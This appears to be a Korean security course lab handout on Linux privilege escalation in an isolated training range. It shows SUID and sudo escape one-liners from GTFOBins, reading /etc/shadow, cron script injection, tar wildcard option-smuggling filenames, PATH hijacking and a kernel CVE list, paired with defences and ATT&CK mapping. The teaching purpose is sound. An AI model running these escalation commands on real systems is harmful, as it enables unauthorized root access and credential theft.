# Week 11: Linux 권한 상승 (Privilege Escalation)

## 학습 목표
- Linux 권한 모델(uid, gid, 퍼미션, 특수 비트)을 이해한다
- SUID/SGID 바이너리를 찾고 GTFOBins로 악용 경로를 확인한다
- sudo 설정 오류(NOPASSWD, 위험 명령)를 점검하고 root 쉘을 획득한다
- cron job 악용과 PATH 하이재킹 시나리오를 실습한다
- 커널 취약점(CVE) 유형을 파악하고 커널 버전으로 매핑한다
- MITRE ATT&CK T1068/T1548.001/T1548.003과 매핑한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 공격자 (Bastion API :8003) |
| web | 10.20.30.80 | 권한상승 대상 (sudo NOPASSWD:ALL 설정) |

## 강의 시간 배분 (3시간)

| 시간 | 내용 |
|------|------|
| 0:00-0:30 | Linux 권한 모델 + SUID/SGID (Part 1~2) |
| 0:30-1:10 | sudo 오설정 + GTFOBins (Part 3) |
| 1:10-1:20 | 휴식 |
| 1:20-2:00 | cron 악용 + PATH 하이재킹 (Part 4~5) |
| 2:00-2:40 | 커널 익스플로잇 + 종합 체크 (Part 6~7) |
| 2:40-2:50 | 휴식 |
| 2:50-3:30 | 방어 + Bastion 자동화 (Part 8~9) |
| 3:30-3:40 | 과제 안내 |

---

# Part 1: Linux 권한 모델

## 1.1 사용자·그룹·퍼미션

```bash
whoami
id                # uid=1000(ccc) gid=1000(ccc) groups=1000(ccc),27(sudo)
ls -la /etc/passwd
# -rw-r--r-- 1 root root ... /etc/passwd
# rw- r-- r-- → 소유자/그룹/기타 순 권한
```

## 1.2 특수 비트

| 비트 | 숫자 | 이름 | 효과 |
|------|------|------|------|
| `s` (owner) | 4000 | SUID | 실행 시 **파일 소유자** 권한으로 동작 |
| `s` (group) | 2000 | SGID | 실행 시 **파일 그룹** 권한으로 동작 |
| `t` | 1000 | Sticky | 디렉토리 내 삭제는 소유자만 |

**핵심 원리 — SUID:**
- `/usr/bin/passwd` 소유자 = root, SUID 설정됨 → 일반 사용자 실행해도 root 권한으로 `/etc/shadow` 수정 가능
- 이 설계 자체는 정상. **문제는 범용 도구(find, vim, python3)에 SUID가 설정되면** → 쉘 실행 기능으로 **root 쉘 획득** 가능

---

# Part 2: SUID 바이너리 악용

## 2.1 SUID 바이너리 탐색

```bash
ssh ccc@10.20.30.80 "find / -perm -4000 -type f 2>/dev/null"
```

**예상 출력 (web 서버):**
```
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**결과 해석:**
- 위 목록은 Ubuntu 기본값. 대부분 정상 용도
- **비정상 SUID**: `/usr/bin/find`, `/usr/bin/vim`, `/usr/bin/python3`, `/usr/bin/bash` 등이 있으면 즉시 의심

## 2.2 GTFOBins — SUID 악용 레시피

GTFOBins(https://gtfobins.github.io)에는 200+ 바이너리의 권한상승·쉘 획득·파일 읽기 기법이 정리되어 있다.

```bash
# find가 SUID인 경우
find . -exec /bin/sh -p \; -quit

# vim이 SUID인 경우
vim -c ':!/bin/sh -p'

# python3이 SUID인 경우
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# bash가 SUID인 경우 (-p 옵션: 실효 UID 유지)
bash -p
```

**`-p` 옵션이 중요한 이유:** bash는 실효 UID와 실 UID가 다르면 보안상 리셋. `-p`는 리셋 금지 → SUID 권한 유지.

---

# Part 3: sudo 설정 오류 (우리 실습의 핵심)

**검증 완료:** web 서버에 `(ALL) NOPASSWD: ALL` 설정. 실습에서 바로 root 획득 가능.

## 3.1 sudo 권한 확인

```bash
ssh ccc@10.20.30.80 "sudo -l"
```

**예상 출력:**
```
User ccc may run the following commands on web:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

**결과 해석:** 이 설정은 **CRITICAL 취약점**. 일반 사용자가 패스워드 없이 모든 명령을 root로 실행 가능.

## 3.2 위험한 sudoers 설정 패턴

```
# /etc/sudoers에서 보이면 의심
ccc ALL=(ALL) NOPASSWD: ALL                  # 완전 오픈
ccc ALL=(root) NOPASSWD: /usr/bin/vim        # vim만 허용이지만 GTFOBins로 탈출
ccc ALL=(root) NOPASSWD: /usr/bin/less       # less도 탈출 가능
ccc ALL=(root) NOPASSWD: /usr/bin/find       # find -exec 탈출
ccc ALL=(root) NOPASSWD: /usr/bin/awk        # awk system()
ccc ALL=(root) NOPASSWD: /usr/bin/env        # env /bin/sh
```

## 3.3 sudo 통한 root 획득 (여러 경로)

```bash
# 1. 전체 허용이면 가장 단순
ssh ccc@10.20.30.80 "sudo su -"
ssh ccc@10.20.30.80 "sudo whoami"   # root

# 2. vim만 허용된 경우
ssh ccc@10.20.30.80 "sudo vim -c ':!/bin/bash'"

# 3. less
ssh ccc@10.20.30.80 "sudo less /etc/passwd"  # less 내에서 !sh

# 4. find
ssh ccc@10.20.30.80 "sudo find /tmp -exec /bin/sh \;"

# 5. awk
ssh ccc@10.20.30.80 "sudo awk 'BEGIN {system(\"/bin/sh\")}'"

# 6. python3
ssh ccc@10.20.30.80 "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"

# 7. env
ssh ccc@10.20.30.80 "sudo env /bin/sh"
```

## 3.4 결과 검증 — /etc/shadow 읽기

**root가 아니면 불가능한 작업. 권한 상승 성공 증거.**

```bash
ssh ccc@10.20.30.80 "sudo cat /etc/shadow" | head -3
```

**예상 출력 (일부):**
```
root:$6$saltsalt$hashhash...:19450:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
```

**결과 해석:**
- `$6$` 접두는 **SHA-512 crypt**. root 해시 확보 — 오프라인 크래킹 대상
- `*` / `!`는 로그인 비활성 계정
- 이 해시 파일을 획득했다는 것 = **시스템 완전 장악** 증거

---

# Part 4: cron Job 악용

## 4.1 cron 확인

```bash
ssh ccc@10.20.30.80 "cat /etc/crontab && ls -la /etc/cron.d/"
ssh ccc@10.20.30.80 "sudo crontab -l 2>/dev/null"
```

## 4.2 취약 시나리오 — root가 실행하는 스크립트에 쓰기 권한

**이것은 무엇인가?** cron에 root가 주기적으로 실행하는 스크립트가 있고, 그 스크립트를 일반 사용자가 수정할 수 있으면 → 스크립트에 악성 코드를 추가해 cron이 root 권한으로 실행되게 함.

```bash
# /etc/crontab이 다음 설정이라면:
# * * * * * root /opt/scripts/backup.sh

# 그 스크립트 퍼미션 확인
ssh ccc@10.20.30.80 "ls -la /opt/scripts/backup.sh 2>/dev/null"

# 모든 사용자가 쓰기 가능(777)이면 악용 가능:
# echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# 1분 대기 후:
# /tmp/rootbash -p   → root 쉘
```

## 4.3 cron 와일드카드 악용 (tar 예시)

**원리:** cron이 `tar czf backup.tar.gz *` 처럼 와일드카드를 쓰고 root로 실행되면, `--checkpoint` 옵션처럼 보이는 파일명을 만들어 tar가 옵션으로 해석하게 함.

```bash
# 취약 cron: * * * * * root cd /tmp/backup && tar czf /opt/backup.tar.gz *

# 공격 파일 생성 (일반 사용자로)
cd /tmp/backup
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
cat > shell.sh << 'EOF'
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF

# cron 실행 후
/tmp/rootbash -p   # → root 쉘
```

---

# Part 5: PATH 하이재킹

## 5.1 원리

SUID 스크립트나 root cron이 절대경로 없이 `date`, `ls`, `ps`를 호출하면, `$PATH`의 우선순위를 조작해 가짜 명령을 먼저 실행시킬 수 있다.

## 5.2 실습 (web 서버에서)

```bash
ssh ccc@10.20.30.80

# 1. 현재 PATH 확인
echo $PATH

# 2. 테스트 스크립트 (절대경로 없이 ls 호출)
cat > /tmp/test_script.sh << 'SCRIPT'
#!/bin/bash
echo "=== list ==="
ls /tmp | head -3
SCRIPT
chmod +x /tmp/test_script.sh

# 3. 가짜 ls
cat > /tmp/ls << 'FAKE'
#!/bin/bash
echo "[!] PATH 하이재킹 — 가짜 ls 실행됨"
/usr/bin/ls "$@"
FAKE
chmod +x /tmp/ls

# 4. PATH 조작
export PATH=/tmp:$PATH

# 5. 실행 — 가짜 ls가 호출됨
/tmp/test_script.sh

# 6. 정리
rm /tmp/ls /tmp/test_script.sh
export PATH=$(echo $PATH | sed 's|/tmp:||')
```

**실제 공격 시나리오:** 위 가짜 `ls`에 `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`를 심고, SUID 스크립트 호출을 유도하면 root 쉘 생성.

---

# Part 6: 커널 익스플로잇 개요

## 6.1 주요 커널 취약점

| CVE | 이름 | 영향 버전 | 기법 |
|-----|------|-----------|------|
| CVE-2016-5195 | Dirty COW | Linux < 4.8.3 | Copy-on-Write 경합 |
| CVE-2022-0847 | Dirty Pipe | Linux 5.8~5.16.11 | 파이프 버퍼 덮어쓰기 |
| CVE-2021-4034 | PwnKit (pkexec) | polkit < 0.120 | 메모리 손상 |
| CVE-2023-2640 | GameOver(lay) | Ubuntu 커널 | OverlayFS 권한상승 |

## 6.2 커널 버전 확인

```bash
ssh ccc@10.20.30.80 "uname -a && cat /etc/os-release | head -5"
```

**결과 해석:** 커널 6.x는 위 CVE 대부분 미적용. 실제 공격은 공개 PoC 확인 + 버전 매칭 필요. 실습에선 **개념 이해**까지만.

---

# Part 7: 종합 권한상승 체크 스크립트

```bash
ssh ccc@10.20.30.80 << 'EOF'
echo "=== whoami ===" && whoami && id
echo "=== kernel ===" && uname -r
echo "=== sudo -l ===" && sudo -n -l 2>&1 | head -5
echo "=== SUID ===" && find / -perm -4000 -type f 2>/dev/null | head -15
echo "=== writable /etc ===" && find /etc -writable -type f 2>/dev/null | head -5
echo "=== cron ===" && cat /etc/crontab 2>/dev/null
echo "=== root processes ===" && ps aux | grep "^root" | head -5
echo "=== listening ports ===" && ss -tlnp 2>/dev/null | head -5
EOF
```

**결과 해석:** 체크 항목별 의심스러운 항목 = 공격 벡터 후보. 수동 침투 테스트의 **첫 10분**에 반드시 수행하는 루틴.

---

# Part 8: 방어 요약

| 공격 벡터 | 방어 |
|-----------|------|
| SUID 남용 | 불필요한 SUID 제거 (`find / -perm -4000` 정기 감사) |
| sudo NOPASSWD ALL | 최소 권한 원칙, 구체적 명령만 허용 |
| sudo vim/less/find 허용 | GTFOBins 탈출 가능 명령 차단 |
| cron 쓰기 권한 | 스크립트 권한 750 이하, root 전용 디렉토리 |
| PATH 하이재킹 | 스크립트에 절대경로 사용 (`/usr/bin/ls`) |
| 커널 취약 | 정기 업데이트, unattended-upgrades |

## MITRE ATT&CK 매핑

| 실습 | ATT&CK |
|------|--------|
| SUID 찾기·악용 | T1548.001 Setuid and Setgid |
| sudo 오설정 악용 | T1548.003 Sudo and Sudo Caching |
| cron 악용 | T1053.003 Cron |
| PATH 하이재킹 | T1574.007 Path Interception by PATH Environment Variable |
| 커널 익스플로잇 | T1068 Exploitation for Privilege Escalation |

---

# Part 9: Bastion 자연어 권한상승 체크

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "web(10.20.30.80)에 ssh ccc@web로 접속해서 sudo -l, SUID 바이너리 목록, /etc/crontab, 커널 버전을 수집하고, 발견된 권한상승 벡터를 CVSS 심각도와 함께 보고서로 정리해줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

---

## 과제 (다음 주까지)

### 과제 1: SUID 감사 (20점)
- web 서버의 SUID 전체 목록
- 각 바이너리가 GTFOBins에 등록되어 있는지 확인
- 악용 가능한 바이너리 목록 + 각 악용 페이로드

### 과제 2: sudo 권한 분석 (20점)
- `sudo -l` 전체 출력
- NOPASSWD:ALL 설정의 CVSS v3.1 스코어 산정
- 수정된 안전한 sudoers 설정 제안 (구체적 명령 제한)

### 과제 3: 전체 권한상승 루트 (30점)
- 3가지 이상 경로로 root 획득 (sudo 직접 / GTFOBins 우회 / cron 시연)
- 각 경로의 실행 명령 + whoami 결과 캡처

### 과제 4: 방어 코드 (15점)
- 안전한 sudoers 템플릿 작성
- SUID 감사 cron 스크립트 작성

### 과제 5: Bastion 자동화 (15점)
- `/ask`로 권한상승 벡터 자동 수집 결과 + `/evidence` 캡처

---

## 다음 주 예고

**Week 12: 지속성 + 안티포렌식**
- SSH 키 삽입, cron 백도어, systemd 서비스
- 로그 삭제·타임스탬프 조작
- Blue Team의 타임라인 재구성

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **SUID** | Set User ID | 실행 시 파일 소유자 권한 획득 |
| **SGID** | Set Group ID | 실행 시 파일 그룹 권한 획득 |
| **Sticky bit** | - | 디렉토리 내 삭제 제한 (`/tmp`) |
| **NOPASSWD** | - | sudo에서 비밀번호 없이 실행 허용 |
| **GTFOBins** | - | 권한상승용 바이너리 악용 레시피 DB |
| **PATH 하이재킹** | - | `$PATH` 우선순위 조작 |
| **Dirty COW** | CVE-2016-5195 | 리눅스 커널 COW 경합 공격 |
| **Dirty Pipe** | CVE-2022-0847 | 파이프 버퍼 덮어쓰기 |
| **PwnKit** | CVE-2021-4034 | polkit pkexec 취약점 |

---

## 📂 실습 참조 파일 가이드

> 이번 주 실제 사용하는 것만.

### Linux 내장 명령 (권한상승 체크 도구)

| 명령 | 용도 |
|------|------|
| `id` / `whoami` | 현재 권한 확인 |
| `sudo -l` / `sudo -n -l` | sudo 허용 명령 확인 (`-n`=non-interactive) |
| `find / -perm -4000 -type f` | SUID 전체 검색 |
| `find / -perm -2000 -type f` | SGID 전체 검색 |
| `find /etc -writable -type f` | 쓰기 가능한 민감 파일 |
| `cat /etc/crontab` / `ls /etc/cron.*/` | cron 전부 |
| `ps aux` | 프로세스 (root 실행 여부) |
| `uname -a` | 커널 버전 |
| `cat /etc/os-release` | 배포판 |

### GTFOBins — 웹 참조 (https://gtfobins.github.io)

| 카테고리 | 의미 |
|----------|------|
| SUID | 파일에 SUID 설정 시 쉘 획득 기법 |
| Sudo | sudo로 허용됐을 때 탈출 기법 |
| Capabilities | `cap_setuid+ep` 같은 커널 capability 악용 |
| Shell | 직접 쉘 획득 |
| File read | 임의 파일 읽기 |
| File write | 임의 파일 쓰기 |

### web 서버 실습 대상

| 항목 | 값 |
|------|-----|
| IP | 10.20.30.80 |
| 계정 | ccc / 1 |
| sudo | `(ALL) NOPASSWD: ALL` (의도적 취약 설정) |
| 셸 | /bin/bash |
| 커널 | 6.x (주요 커널 CVE 대부분 미적용) |

### Bastion API

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 권한상승 체크 |
| GET | `/evidence` | 기록 |

---

> **실습 환경 검증 완료** (2026-03-28): sudo NOPASSWD 확인, SUID 기본 바이너리 목록 확인.

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (11주차) 학습 주제와 직접 연관된 *실제* incident:

### Kerberos AS-REP roasting — krbtgt 외부 유출

> **출처**: WitFoo Precinct 6 / `incident-2024-08-002` (anchor: `anc-7c9fb0248f47`) · sanitized
> **시점**: 2024-08-15 11:02 ~ 11:18 (16 분)

**관찰**: win-dc01 의 PreAuthFlag=False 계정 3건 식별 + AS-REP 응답이 외부 IP 198.51.100.42 로 유출.

**MITRE ATT&CK**: **T1558.004 (AS-REP Roasting)**

**IoC**:
  - `198.51.100.42`
  - `krbtgt-hash:abc123def`

**학습 포인트**:
- PreAuthentication 비활성화 계정이 곧 공격 표면 (서비스/legacy/오설정)
- Hash 추출 → hashcat 으로 오프라인 brute force → Domain Admin 가능성
- 탐지: DC 의 EID 4768 + AS-REP 패킷 길이 / 외부 destination IP
- 방어: 모든 계정 PreAuth 활성, krbtgt 분기별 회전, FIDO2 도입


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
